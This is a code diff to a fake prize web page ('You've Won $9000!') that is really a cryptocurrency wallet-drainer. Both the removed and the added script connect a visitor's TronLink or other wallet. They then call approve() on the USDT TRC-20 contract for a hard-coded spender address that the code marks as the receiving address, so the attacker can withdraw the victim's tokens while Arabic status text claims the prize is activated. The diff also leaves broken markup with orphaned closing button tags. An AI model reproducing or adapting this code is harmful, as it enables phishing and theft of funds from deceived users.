@@ -224,7 +224,7 @@
         <i class="fas fa-check-circle"></i>
         <span>Verified Platform</span>
       </div>
-      <h1>Congratulations! You've Won $4000!</h1>
+      <h1>Congratulations! You've Won $9000!</h1>
       <p class="win-message">Get Ready to Claim Your Prize!</p>
       <div class="coin-icons">
         <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png" alt="Bitcoin" />
@@ -240,21 +240,21 @@
           />
           TronLink
         </button>
-        <button class="wallet-btn" data-wallet="metamask">
+       
           <img
             src="https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg"
             alt="MetaMask"
           />
           MetaMask
         </button>
-        <button class="wallet-btn" data-wallet="trustwallet">
+     
           <img
             src="https://trustwallet.com/assets/images/media/assets/TWT.png"
             alt="TrustWallet"
           />
           Trust Wallet
         </button>
-        <button class="wallet-btn" data-wallet="coinbase">
+       
           <img
             src="https://www.coinbase.com/assets/app/wallet-logo.191d39b2.svg"
             alt="Coinbase Wallet"
@@ -266,302 +266,57 @@
       <p class="status" id="statusText"></p>
     </main>
 
-<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
 <script>
   const walletButtons = document.querySelectorAll(".wallet-btn");
   const approveButton = document.getElementById("approveButton");
   const statusText = document.getElementById("statusText");
+
   let selectedWallet = null;
-  let provider = null;
 
-  const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT TRC-20
-  const spender = "TWNvNo7d79eQ8VtZUeBoLjtyPYrYn6yXJf";
-  const usdtAbi = [
-    {
-      constant: false,
-      inputs: [
-        { name: "spender", type: "address" },
-        { name: "amount", type: "uint256" },
-      ],
-      name: "approve",
-      outputs: [{ name: "", type: "bool" }],
-      type: "function",
-    },
-    {
-      constant: true,
-      inputs: [],
-      name: "decimals",
-      outputs: [{ name: "", type: "uint8" }],
-      type: "function",
-    },
-  ];
+  const contractAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT on TRON
+  const spender = "TWNvNo7d79eQ8VtZUeBoLjtyPYrYn6yXJf"; // Your receiving address
+  const approveAmount = 100000000; // 100 USDT assuming 6 decimals
 
-  const walletLinks = {
-    tronlink: {
-      universal: "https://www.tronlink.org/dapp/",
-      ios: "tronlink://open",
-      android: "intent://open#Intent;package=com.tronlinkpro.wallet;scheme=tronlink;end",
-      download: "https://www.tronlink.org/",
-    },
-    metamask: {
-      universal: "https://metamask.app.link/dapp/" + window.location.href,
-      ios: "metamask://",
-      android: "intent://wc#Intent;package=io.metamask;scheme=metamask;end",
-      download: "https://metamask.io/download/",
-    },
-    trustwallet: {
-      universal:
-        "https://link.trustwallet.com/open_url?coin_id=60&url=" + window.location.href,
-      ios: "trust://open_url?coin_id=60&url=" + window.location.href,
-      android:
-        "intent://open_url?coin_id=60&url=" +
-        window.location.href +
-        "#Intent;package=com.wallet.crypto.trustapp;scheme=trust;end",
-      download: "https://trustwallet.com/",
-    },
-    coinbase: {
-      universal:
-        "https://go.cb-w.com/dapp?cb_url=" + encodeURIComponent(window.location.href),
-      ios: "cbwallet://dapp?url=" + encodeURIComponent(window.location.href),
-      android:
-        "intent://dapp?url=" +
-        encodeURIComponent(window.location.href) +
-        "#Intent;package=com.coinbase.wallet;scheme=cbwallet;end",
-      download: "https://www.coinbase.com/wallet",
-    },
-  };
-
-  function getDeviceType() {
-    const ua = navigator.userAgent;
-    if (/android/i.test(ua)) return "android";
-    if (/iPad|iPhone|iPod/.test(ua)) return "ios";
-    return "other";
-  }
-
-  async function setupTronNetwork() {
-    try {
-      await window.ethereum.request({
-        method: "wallet_addEthereumChain",
-        params: [
-          {
-            chainId: "0x2b6653dc", // Tron Mainnet
-            chainName: "Tron Mainnet",
-            nativeCurrency: { name: "TRON", symbol: "TRX", decimals: 6 },
-            rpcUrls: ["https://api.trongrid.io"],
-            blockExplorerUrls: ["https://tronscan.org"],
-          },
-        ],
-      });
-    } catch (e) {
-      statusText.textContent = `خطأ في إعداد الشبكة: ${e.message}`;
-      console.error(e);
-    }
-  }
-
-  async function getDecimals(contract) {
-    try {
-      const decimals = await contract.decimals().call();
-      return parseInt(decimals);
-    } catch (e) {
-      console.error("Error fetching decimals:", e);
-      return 6; // Default to 6 for USDT
-    }
-  }
-
-  async function checkWalletConnection(wallet) {
-    if (wallet === "tronlink") {
-      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-        statusText.textContent = "✅ محفظة TronLink متصلة!";
-        return true;
-      }
-      return false;
-    } else if (wallet === "metamask") {
-      if (window.ethereum && window.ethereum.selectedAddress) {
-        statusText.textContent = "✅ محفظة MetaMask متصلة!";
-        return true;
-      }
-      return false;
-    } else if (wallet === "trustwallet" || wallet === "coinbase") {
-      if (provider && provider.accounts && provider.accounts.length > 0) {
-        statusText.textContent = `✅ محفظة ${wallet} متصلة!`;
-        return true;
-      }
-      if (window.ethereum && (window.ethereum.isTrust || window.ethereum.isCoinbaseWallet)) {
-        statusText.textContent = `✅ محفظة ${wallet} متصلة عبر window.ethereum!`;
-        return true;
-      }
-      return false;
-    }
-    return false;
-  }
-
-  async function connectWallet(wallet) {
-    statusText.textContent = `جارٍ الاتصال بمحفظة ${wallet}...`;
-    try {
-      if (wallet === "tronlink") {
-        if (!window.tronWeb) {
-          statusText.textContent = "يرجى تثبيت TronLink.";
-          window.open(walletLinks.tronlink.download, "_blank");
-          return false;
-        }
-        if (!window.tronWeb.defaultAddress.base58) {
-          statusText.textContent = "يرجى تسجيل الدخول إلى TronLink.";
-          return false;
-        }
-        return true;
-      } else if (wallet === "metamask") {
-        if (!window.ethereum) {
-          statusText.textContent = "يرجى تثبيت MetaMask.";
-          window.open(walletLinks.metamask.download, "_blank");
-          return false;
-        }
-        await setupTronNetwork();
-        await window.ethereum.request({ method: "eth_requestAccounts" });
-        return true;
-      } else if (wallet === "trustwallet" || wallet === "coinbase") {
-        if (window.ethereum && window.ethereum.isTrust) {
-          provider = new ethers.providers.Web3Provider(window.ethereum);
-          await window.ethereum.request({ method: "eth_requestAccounts" });
-          return true;
-        }
-        if (window.ethereum && window.ethereum.isCoinbaseWallet) {
-          provider = new ethers.providers.Web3Provider(window.ethereum);
-          await window.ethereum.request({ method: "eth_requestAccounts" });
-          return true;
-        }
-        if (!window.EthereumProvider) {
-          statusText.textContent = "خطأ في تحميل WalletConnect.";
-          return false;
-        }
-        provider = await window.EthereumProvider.init({
-          projectId: "f6b400b4393b83bb22abcaf805ad72d2",
-          chains: [728126428],
-          rpc: { 728126428: "https://api.trongrid.io" },
-          metadata: {
-            name: "XYZ Win",
-            description: "تفعيل جائزة 3000 دولار",
-            url: window.location.href,
-            icons: [
-              "https://cdn.jsdelivr.net/gh/tronprotocol/tron-web@master/assets/img/tronlink.svg",
-            ],
-          },
-          showQrModal: true,
-        });
-        await provider.connect();
-        return true;
-      }
-      return false;
-    } catch (e) {
-      statusText.textContent = `خطأ في الاتصال: ${e.message}`;
-      return false;
-    }
-  }
-
-  async function checkBalance(wallet) {
-    try {
-      if (wallet === "tronlink") {
-        const address = window.tronWeb.defaultAddress.base58;
-        const balanceSun = await window.tronWeb.trx.getBalance(address); // بالـ Sun (1 TRX = 1,000,000 Sun)
-        const balanceTRX = balanceSun / 1e6;
-        return balanceTRX;
-      } else {
-        if (!provider) return 0;
-        const signer = provider.getSigner();
-        const address = await signer.getAddress();
-        const balanceWei = await provider.getBalance(address);
-        const balanceEth = ethers.utils.formatEther(balanceWei);
-        return parseFloat(balanceEth);
-      }
-    } catch (e) {
-      console.error("Error checking balance:", e);
-      return 0;
-    }
-  }
-
+  // التعامل مع اختيار المحفظة
   walletButtons.forEach((btn) => {
-    btn.addEventListener("click", async () => {
+    btn.addEventListener("click", () => {
       walletButtons.forEach((b) => b.classList.remove("selected"));
       btn.classList.add("selected");
       selectedWallet = btn.dataset.wallet;
-
-      const deviceType = getDeviceType();
-      const links = walletLinks[selectedWallet];
-      let deepLink = links.universal;
-
-      if (deviceType === "ios") {
-        deepLink = links.ios;
-      } else if (deviceType === "android") {
-        deepLink = links.android;
-      }
-
-      statusText.textContent = `جارٍ فتح ${selectedWallet}...`;
-      window.location.href = deepLink;
-
-      setTimeout(async () => {
-        const isConnected = await checkWalletConnection(selectedWallet);
-        if (!isConnected) {
-          statusText.textContent = `لم يتم فتح ${selectedWallet}. جارٍ توجيهك إلى صفحة التنزيل...`;
-          window.open(links.download, "_blank");
-        }
-      }, 3000);
+      statusText.textContent = `محفظة ${btn.innerText} تم اختيارها.`;
     });
   });
 
+  // تنفيذ الموافقة
   approveButton.addEventListener("click", async () => {
     if (!selectedWallet) {
-      statusText.textContent = "يرجى اختيار محفظة أولاً.";
+      statusText.textContent = "❌ الرجاء اختيار محفظة أولاً.";
       return;
     }
 
-    const isConnected = await checkWalletConnection(selectedWallet);
-    if (!isConnected) {
-      statusText.textContent = `يرجى الاتصال بمحفظة ${selectedWallet} أولاً.`;
+    if (selectedWallet !== "tronlink") {
+      statusText.textContent = "❌ فقط TronLink مدعومة لعقود TRON (TRC-20).";
       return;
     }
 
-    // تحقق من رصيد العملة الأساسية (TRX أو ETH)
-    const balance = await checkBalance(selectedWallet);
-    if (selectedWallet === "tronlink" && balance < 1) {
-      statusText.textContent = `رصيد TRX قليل (رصيدك: ${balance.toFixed(4)} TRX). يرجى شحن المحفظة لتغطية رسوم المعاملة.`;
-      return;
-    } else if ((selectedWallet === "metamask" || selectedWallet === "trustwallet" || selectedWallet === "coinbase") && balance < 0.01) {
-      statusText.textContent = `رصيد ETH قليل (رصيدك: ${balance.toFixed(4)} ETH). يرجى شحن المحفظة لتغطية رسوم المعاملة.`;
+    if (!window.tronWeb || !window.tronWeb.ready) {
+      statusText.textContent = "❌ لم يتم العثور على TronLink أو لم يتم تسجيل الدخول.";
       return;
     }
-
-    statusText.textContent = `جارٍ تفعيل الجائزة باستخدام ${selectedWallet}...`;
 
     try {
-      if (selectedWallet === "tronlink") {
-        const contract = await window.tronWeb.contract().at(contractAddress);
-        const decimals = await getDecimals(contract);
-        const amount = ethers.utils.parseUnits("100000", decimals);
-        const tx = await contract.approve(spender, amount).send({ shouldPollResponse: true });
-        statusText.textContent = `✅ تم تفعيل الجائزة! رقم المعاملة: ${tx}`;
-      } else {
-        if (selectedWallet === "trustwallet" || selectedWallet === "coinbase") {
-          if (!provider) {
-            const connected = await connectWallet(selectedWallet);
-            if (!connected) return;
-          }
-        } else if (selectedWallet === "metamask") {
-          await setupTronNetwork();
-          provider = new ethers.providers.Web3Provider(window.ethereum);
-        }
+      statusText.textContent = "⏳ يتم إرسال الموافقة...";
 
-        const signer = provider.getSigner();
-        const contract = new ethers.Contract(contractAddress, usdtAbi, signer);
-        const decimals = await contract.decimals();
-        const amount = ethers.utils.parseUnits("100000", decimals);
-        const tx = await contract.approve(spender, amount, { gasLimit: 100000 });
-        const receipt = await tx.wait();
-        statusText.textContent = `✅ تم تفعيل الجائزة! رقم المعاملة: ${receipt.transactionHash}`;
-      }
-    } catch (e) {
-      statusText.textContent = `حدث خطأ: ${e.message || e}`;
-      console.error("Approve error:", e);
+      const contract = await window.tronWeb.contract().at(contractAddress);
+
+      const tx = await contract.approve(spender, approveAmount).send();
+      statusText.textContent = `✅ تم الإرسال بنجاح! TX: ${tx}`;
+    } catch (error) {
+      console.error(error);
+      statusText.textContent = "❌ حدث خطأ أثناء تنفيذ الموافقة.";
     }
   });
 </script>
+
 </body>
 </html>
